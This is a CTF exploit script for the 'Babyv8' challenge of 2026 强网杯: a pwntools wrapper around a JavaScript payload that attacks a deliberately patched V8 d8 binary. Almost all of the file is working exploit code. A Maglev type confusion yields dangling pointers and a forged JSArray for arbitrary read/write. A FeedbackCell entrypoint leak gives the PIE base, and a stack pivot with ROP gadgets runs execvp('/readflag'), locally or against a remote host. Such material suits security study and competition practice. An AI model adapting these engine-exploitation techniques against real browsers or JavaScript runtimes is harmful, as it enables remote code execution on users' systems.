#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Babyv8 exploit (2026 强网杯)

两处人为补丁串成的链（题解第 1/2 节）：
  0006  Maglev 循环 phi 错误保留 Smi 类型
        -> 对象指针被写进 PACKED_SMI_ELEMENTS 的 backing store，且不生成
           old->young 写屏障
        -> minor GC 后老年代槽位里留下悬空压缩指针
        -> 用 double 数组重占位伪造 JSArray，得到 V8 cage 内任意读写
  0007  FeedbackCell 缓存未经保护的原生入口（位于对象 +0x10）
        -> 读 cached_entrypoint 泄露 d8 PIE
        -> 覆盖 cached_entrypoint 为 push rbx; pop rsp; ret，栈枢转到 FeedbackCell
        -> ROP: xor esi,esi; ret / execvp("/readflag")

最终目标是执行 setuid-root 的 /readflag，而不是直接读 /flag。

用法：
    python exp.py --d8 ./d8                 # 直接跑 d8
    python exp.py TARGET_HOST PORT          # 远端（服务把 stdin 交给 d8 执行时）
"""
import argparse
import os
import sys
import tempfile

from pwn import context, log, process, remote

context.log_level = 'info'

TARGET_HOST = "TARGET_HOST"
DEFAULT_PORT = 9999

EXPLOIT_JS = r'''
// ---------------------------------------------------------------- 漏洞触发器
function put(a, o, n) {
  let x = 0;
  for (let i = 0; i < n; i++) x = i === 0 ? 0 : o;
  a[0] = x;
  return a;
}

for (let i = 0; i < 500; i++) put([0, 1], 1, 3);
Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, 300);

let probe = [0, 1];
probe[0] = 42;
const probeObject = {};
put(probe, probeObject, 3);
if (probe[0] !== probeObject || String(probe).startsWith('[object')) {
  throw Error('Maglev type confusion did not trigger');
}
print('stage: trigger');

// ---------------------------------------------------------------- 常量
const BAD_COUNT = 32;
const SPRAY_COUNT = 256;
const FAKE_ARRAY_LENGTH = 16;
const FAKE_LENGTH_SMI = FAKE_ARRAY_LENGTH << 1;
const PACKED_DOUBLE_ARRAY_MAP = 0x0100baa9;
const EMPTY_PROPERTIES = 0x7e5;
const PIE_ENTRY_OFFSET = 0x315a380n;
const GADGET_SKIP = 0x18bb132n;      // add rsp, 0x10; pop rbp; ret
const GADGET_ZERO_RSI = 0x193a9ccn;  // xor esi, esi; ret
const GADGET_EXECVP = 0x34be450n;    // execvp@plt
const GADGET_PIVOT = 0x27e9e69n;     // push rbx; pop rsp; ret
const READFLAG_PATH = '/readflag';

// ---------------------------------------------------------------- 工具
const view = new DataView(new ArrayBuffer(8));
function u2f(lo, hi) {
  view.setUint32(0, lo >>> 0, true);
  view.setUint32(4, hi >>> 0, true);
  return view.getFloat64(0, true);
}
function f2u(f) {
  view.setFloat64(0, f, true);
  return [view.getUint32(0, true), view.getUint32(4, true)];
}
function join64(pair) {
  return BigInt(pair[0] >>> 0) | (BigInt(pair[1] >>> 0) << 32n);
}
function split64(x) {
  return [Number(x & 0xffffffffn) >>> 0, Number((x >> 32n) & 0xffffffffn) >>> 0];
}
function hexs(x) { return '0x' + x.toString(16); }

// addrOf: 利用 String(a) 把 SMI 数组槽位按 SMI 解释的缺陷，还原带 tag 的压缩指针
const leaker = [0, 1];
leaker[0] = 42;
function addrOf(o) {
  put(leaker, o, 3);
  const text = String(leaker);
  const first = Number(text.slice(0, text.indexOf(',')));
  if (!Number.isInteger(first)) throw Error('addrOf failed: ' + text);
  return (first * 2 + 1) >>> 0;
}

// ---------------------------------------------------------------- GC 观测
function trashOne() { new Array(256).fill(1.1); }
function moveOnce(o) {
  const before = addrOf(o);
  for (let i = 0; i < 10000; i++) {
    trashOne();
    if (addrOf(o) !== before) return i + 1;
  }
  throw Error('minor GC was not observed');
}

// ---------------------------------------------------------------- 堆布置
const smiArrays = [];
for (let i = 0; i < BAD_COUNT; i++) {
  const a = [0, 1];
  a[0] = 42;                        // 解除 COW，拿到可被按 SMI 存储的 backing store
  smiArrays.push(a);
}

const victim = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8,
                9.9, 10.1, 11.1, 12.1, 13.1, 14.1, 15.1, 16.1];
victim[0] = 1.1;                    // PACKED_DOUBLE_ELEMENTS，私有 backing store
const gcCanary = {};
const holder = [victim];

moveOnce(smiArrays[0]);             // 数组与 victim 晋升到老年代
moveOnce(gcCanary);

const staleAddrs = [];
for (let i = 0; i < BAD_COUNT; i++) {
  const o = { i: i, f: 1.1 };
  put(smiArrays[i], o, 3);          // 无写屏障：老年代槽位指向新生代对象
  staleAddrs.push(addrOf(o));
  holder.push(o);
}
moveOnce(gcCanary);                 // 把这些新生代对象搬走，旧地址成为悬空值
moveOnce(holder);
print('stage: dangling');

// ---------------------------------------------------------------- 重占位
const victimTagged = addrOf(victim);
const victimAddr = victimTagged;              // 带 tag 的压缩指针
const dataStart = (victimTagged + 23) >>> 0;   // +0x10 元素区，tagged 多 1

const spray = [];
for (let i = 0; i < SPRAY_COUNT; i++) {
  const arr = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8,
               9.9, 10.1, 11.1, 12.1, 13.1, 14.1, 15.1, 16.1];
  arr[0] = 1.1;
  spray.push(arr);
}

const fakeMapProp = u2f(PACKED_DOUBLE_ARRAY_MAP, EMPTY_PROPERTIES);
const fakeElemLen = u2f((victimAddr - 8) >>> 0, FAKE_LENGTH_SMI);
// 伪对象相对 double 槽错开 4 字节时的三段写法
const shifted0 = u2f(0, PACKED_DOUBLE_ARRAY_MAP);
const shifted1 = u2f(EMPTY_PROPERTIES, (victimAddr - 8) >>> 0);
const shifted2 = u2f(FAKE_LENGTH_SMI, 0);

function placeFake(addr) {
  for (const arr of spray) {
    const start = (addrOf(arr) + 23) >>> 0;
    if (addr < start || addr + 16 > start + 16 * 8) continue;
    const delta = (addr - start) >>> 0;
    const idx = (delta >> 3) >>> 0;
    if ((delta & 7) === 0) {
      arr[idx] = fakeMapProp;
      arr[idx + 1] = fakeElemLen;
    } else {
      arr[idx] = shifted0;
      arr[idx + 1] = shifted1;
      arr[idx + 2] = shifted2;
    }
    return true;
  }
  return false;
}

let fakeArray = null;
for (const addr of staleAddrs) {
  if (!placeFake(addr)) continue;
  for (let i = 0; i < BAD_COUNT; i++) {
    const cand = smiArrays[i][0];
    if (cand && typeof cand === 'object' && cand.length === FAKE_ARRAY_LENGTH) {
      fakeArray = cand;
      break;
    }
  }
  if (fakeArray) break;
}
if (!fakeArray) throw Error('fake JSArray was not recognized');
print('stage: fake array');

// ---------------------------------------------------------------- 读写原语
function read64(addr) {
  fakeArray[1] = u2f((addr - 7) >>> 0, FAKE_LENGTH_SMI);
  return f2u(victim[0]);
}
function write64(addr, lo, hi) {
  fakeArray[1] = u2f((addr - 7) >>> 0, FAKE_LENGTH_SMI);
  victim[0] = u2f(lo, hi);
}

// 可用性自检：victim 头字段 + 另一个 double 数组首元素
{
  const m = read64((victimTagged - 1) >>> 0);   // 对象头：map + properties
  if (m[0] !== PACKED_DOUBLE_ARRAY_MAP || m[1] !== EMPTY_PROPERTIES) {
    throw Error('victim header mismatch: ' + m.map(hexs).join(' '));
  }
  const probeArr = [3.3, 4.4, 5.5, 6.6];
  probeArr[0] = 3.3;
  const pa = (addrOf(probeArr) + 23) >>> 0;        // 元素区起点
  write64(pa, f2u(5.5)[0], f2u(5.5)[1]);
  const back = read64(pa);
  if (f2u(5.5)[0] !== back[0] || f2u(5.5)[1] !== back[1]) {
    throw Error('read/write primitive is not effective');
  }
}
print('stage: arbitrary rw');

// ---------------------------------------------------------------- 泄露 PIE
const target = new Function('x', 'let y=x;' + 'y+=1;'.repeat(1000) + 'return y;');
function caller(x) { return target(x); }
for (let i = 0; i < 100000; i++) caller(i);

const entryLeak = function entryLeak() { return 1; };   // 从未被调用，缓存入口仍是二进制入口

const targetAddr = addrOf(target);
const targetCell = read64((targetAddr + 0x17) >>> 0)[0];      // JSFunction+0x18 = FeedbackCell
const leakAddr = addrOf(entryLeak);
const leakCell = read64((leakAddr + 0x17) >>> 0)[0];
const pie = join64(read64((leakCell + 0x0f) >>> 0)) - PIE_ENTRY_OFFSET;
if ((pie & 0xfffn) !== 0n) throw Error('bad PIE base ' + hexs(pie));
print('stage: pie ' + hexs(pie));

// ---------------------------------------------------------------- ROP + execvp
const zeroArgv = split64(pie + GADGET_ZERO_RSI);
const execvp = split64(pie + GADGET_EXECVP);
const skip = split64(pie + GADGET_SKIP);
const pivot = split64(pie + GADGET_PIVOT);

const path = [0x6165722f, 0x616c6664];      // "/readfla"
const pathTail = [0x00000067, 0x00000000];  // "g\0\0\0" + 终止

write64((targetCell + 0x18) >>> 0, 0, 0);
write64((targetCell + 0x20) >>> 0, zeroArgv[0], zeroArgv[1]);
write64((targetCell + 0x28) >>> 0, execvp[0], execvp[1]);
write64(targetCell >>> 0, skip[0], skip[1]);
write64((targetAddr + 8) >>> 0, pathTail[0], pathTail[1]);
write64(targetAddr >>> 0, path[0], path[1]);
write64((targetCell + 0x0f) >>> 0, pivot[0], pivot[1]);   // 最后写：缓存入口

print('stage: hijack');
caller(1);
'''.strip()


def main():
    ap = argparse.ArgumentParser(description="Babyv8 exploit")
    ap.add_argument("host", nargs="?", default=None)
    ap.add_argument("port", nargs="?", type=int, default=DEFAULT_PORT)
    ap.add_argument("--d8", default="./d8", help="local d8 path")
    args = ap.parse_args()

    if args.host:
        io = remote(args.host, args.port)
        io.send(EXPLOIT_JS.encode() + b"\n")
        out = io.recvall(timeout=15)
        io.close()
    else:
        fd, path = tempfile.mkstemp(suffix=".js")
        os.close(fd)
        with open(path, "w", encoding="utf-8") as f:
            f.write(EXPLOIT_JS + "\n")
        log.info("running %s %s" % (args.d8, path))
        io = process([args.d8, path])
        out = io.recvall(timeout=20)
        io.close()
        os.unlink(path)

    text = out.decode("latin-1", "replace")
    idx = text.find("flag{")
    if idx >= 0:
        end = text.find("}", idx)
        print("[+] FLAG:", text[idx:end + 1])
    else:
        print(text[-4000:])


if __name__ == "__main__":
    main()
